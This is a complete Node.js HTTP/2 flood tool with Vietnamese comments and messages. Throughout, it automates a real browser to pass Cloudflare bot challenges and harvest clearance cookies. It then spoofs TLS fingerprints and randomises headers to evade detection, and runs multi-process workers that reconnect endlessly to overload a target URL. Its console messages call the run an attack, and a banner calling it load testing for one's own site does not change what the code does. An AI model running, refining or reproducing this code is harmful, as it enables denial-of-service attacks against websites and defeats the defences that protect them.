const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

// TLS Configuration
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(':'),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

// Headers arrays
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0'
];

const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9'
];

// Parse arguments
if (process.argv.length < 6) {
    console.log("\x1b[31m❌ Cách sử dụng: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mVí dụ: node uam.js https://example.com 60 5 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

const parsedTarget = url.parse(args.target);

// Hàm flood không sử dụng proxy
function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path;

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = randomDelay(100, 1000);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return null;
        }

        const chromever = getChromeVersion(userAgent) || "126";
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
        ];

        let fixed = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
                "purpure-secretf-id": "formula-" + generateRandomString(1, 2)
            }),
            "priority": "u=0, i",
            "te": "trailers"
        };

        let randomHeaders = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(1, 2)]: "root-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["Java-x-seft" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { [generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {})
        };

        let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "purpure-secretf-id",
            "priority"
        ];

        let headersArray = Object.entries(fixed);
        let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);

        shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, v]) => k === insertAfter);
            if (index !== -1) {
                headersArray.splice(index + 1, 0, [key, value]);
            }
        });

        let dynHeaders = Object.fromEntries(headersArray);

        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        function createCustomTLSSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                ecdhCurve: "X25519:P-256:P-384",
                ...(Math.random() < 0.5
                    ? { secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] }
                    : {})
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000);
            return tlsSocket;
        }

        const tlsSocket = createCustomTLSSocket(parsed);
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
            }
        }, (session) => {
            session.setLocalWindowSize(12517377 + 65535);
        });

        client.on("connect", () => {
            let clearr = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request({ ...dynHeaders }, {
                        weight: Math.random() < 0.5 ? 42 : 256,
                        depends_on: 0,
                        exclusive: false
                    });

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        if (res[":status"] === 429) {
                            interval = 20000;
                            client.close();
                        }
                    });
                    request.end();
                }
            }, interval);

            let goawayCount = 0;
            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
                setTimeout(() => {
                    goawayCount++;
                    client.destroy();
                    tlsSocket.destroy();
                    flood(userAgent, cookie);
                }, backoff);
            });

            client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });

            client.on("error", (error) => {
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });
        });

        client.on("error", (error) => {
            client.destroy();
            tlsSocket.destroy();
        });
    } catch (err) {
        console.log(`Lỗi trong hàm flood: ${err.message}`);
    }
}

// Helper functions
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

// Cloudflare Bypass
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;
    
    try {
        console.log(`\x1b[33m🔄 Bắt đầu thử bypass lần ${attemptNum}...\x1b[0m`);
        
        response = await connect({
            headless: 'auto',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080'
            ],
            turnstile: true,
            connectOption: {
                defaultViewport: null
            }
        });
        
        browser = response.browser;
        page = response.page;
        
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        });
        
        console.log(`\x1b[33m⏳ Đang truy cập ${args.target}...\x1b[0m`);
        
        try {
            await page.goto(args.target, { 
                waitUntil: 'domcontentloaded',
                timeout: 45000 
            });
        } catch (navError) {
            console.log(`\x1b[33m⚠️ Cảnh báo truy cập: ${navError.message}\x1b[0m`);
        }
        
        console.log("\x1b[33m⏳ Đang kiểm tra thử thách Cloudflare...\x1b[0m");
        
        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 40;
        
        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            
            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    console.log(`\x1b[32m✅ Tìm thấy cookie sau ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
                    challengeCompleted = true;
                    break;
                }
                
                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    
                    if (title.includes("just a moment") || 
                        title.includes("checking") ||
                        bodyText.includes("checking your browser") ||
                        bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    
                    return document.body && document.body.children.length > 3;
                });
                
            } catch (evalError) {
            }
            
            checkCount++;
            
            if (checkCount % 10 === 0) {
                console.log(`\x1b[33m⏳ Vẫn đang kiểm tra... (${(checkCount * 0.5).toFixed(1)}s đã trôi qua)\x1b[0m`);
            }
        }
        
        await new Promise(r => setTimeout(r, 1000));
        
        const cookies = await page.cookies();
        console.log(`\x1b[36m📋 Tìm thấy ${cookies.length} cookies trong ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
        
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        if (cfClearance) {
            console.log(`\x1b[32m✅ cf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
        }
        
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await page.close();
        await browser.close();
        
        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: true,
            attemptNum: attemptNum
        };
        
    } catch (error) {
        console.log(`\x1b[31m❌ Thử bypass lần ${attemptNum} thất bại: ${error.message}\x1b[0m`);
        
        try {
            if (page) await page.close();
            if (browser) await browser.close();
        } catch (cleanupError) {}
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║     CLOUDFLARE BYPASS - CHẾ ĐỘ SONG SONG   ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    console.log(`\x1b[36m🎯 Số lượng cookie mục tiêu: ${totalCount}\x1b[0m`);
    
    const results = [];
    let attemptCount = 0;
    
    const batchSize = 2;
    
    while (results.length < totalCount) {
    const concurrentBypassSessions = 10; // Số lượng phiên bypass chạy song song
    const remaining = totalCount - results.length;
    const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
        
        console.log(`\n\x1b[33m🔄 Bắt đầu batch song song (${currentBatchSize} phiên)...\x1b[0m`);
        
        const batchPromises = [];
        for (let i = 0; i < currentBatchSize; i++) {
            attemptCount++;
            batchPromises.push(bypassCloudflareOnce(attemptCount));
        }
        
        const batchResults = await Promise.all(batchPromises);
        
        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                console.log(`\x1b[32m✅ Phiên ${result.attemptNum} thành công! (Tổng: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31m❌ Phiên ${result.attemptNum} thất bại\x1b[0m`);
            }
        }
        
        if (results.length < totalCount) {
            console.log(`\x1b[33m⏳ Chờ 2s trước batch tiếp theo...\x1b[0m`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    
    if (results.length === 0) {
        console.log("\x1b[33m⚠️ Không lấy được cookie Cloudflare nào, sử dụng header mặc định\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true
        });
    }
    
    console.log(`\n\x1b[32m✅ Tổng số phiên lấy được: ${results.length}\x1b[0m`);
    return results;
}

// Hàm runFlooder
function runFlooder() {
    const bypassInfo = randomElement(global.bypassData || []);
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    
    flood(userAgent, cookieString);
}

// Display stats
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        KIỂM TRA TẢI TRỌNG NÂNG CAO  ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    console.log(`\x1b[36m🎯 Mục tiêu:\x1b[0m ${args.target}`);
    console.log(`\x1b[36m⏱  Thời gian:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36m⏳ Còn lại:\x1b[0m ${remaining}s`);
    console.log(`\x1b[36m🔧 Cấu hình:\x1b[0m Tốc độ: ${args.Rate}/s | Luồng: ${args.threads}`);
    console.log(`\x1b[36m🍪 Phiên:\x1b[0m ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} yêu cầu`);
    console.log("\x1b[33m📊 Thống kê:\x1b[0m");
    console.log(`   \x1b[32m✅ Thành công:\x1b[0m ${global.successRequests || 0}`);
    console.log(`   \x1b[31m❌ Thất bại:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`   \x1b[36m📈 Tổng:\x1b[0m ${global.totalRequests || 0}`);
    console.log(`   \x1b[33m⚡ Tốc độ:\x1b[0m ${elapsed > 0 ? ((global.totalRequests || 0)/elapsed).toFixed(2) : 0} req/s`);
    
    const total = global.totalRequests || 0;
    const success = global.successRequests || 0;
    console.log(`   \x1b[32m✓ Tỷ lệ thành công:\x1b[0m ${total > 0 ? ((success/total)*100).toFixed(2) : 0}%`);
    
    if (remaining > 0) {
        const progress = Math.floor((elapsed / args.time) * 30);
        const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
        console.log(`\n\x1b[36mTiến độ: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
    }
}

// Initialize global stats
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

// Main execution
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        KIỂM TRA TẢI TRỌNG NÂNG CAO    ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    console.log("\x1b[33m⚠️  CHỈ SỬ DỤNG CHO WEBSITE CỦA BẠN!\x1b[0m\n");
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m✅ Đã lấy thành công ${bypassResults.length} phiên!\x1b[0m`);
        console.log("\x1b[32m🚀 Bắt đầu tấn công...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults 
            });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: bypassResults 
                });
            }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32m✅ Tấn công hoàn tất!\x1b[0m");
            console.log(`\x1b[36m📊 Thống kê cuối cùng:\x1b[0m`);
            console.log(`   Tổng yêu cầu: ${global.totalRequests}`);
            console.log(`   Thành công: ${global.successRequests}`);
            console.log(`   Thất bại: ${global.failedRequests}`);
            console.log(`   Phiên sử dụng: ${bypassResults.length}`);
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    let workerBypassData = [];
    let attackInterval;
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            attackInterval = setInterval(() => {
                for (let i = 0; i < 10; i++) {
                    runFlooder();
                }
            }, 100);
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
    
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});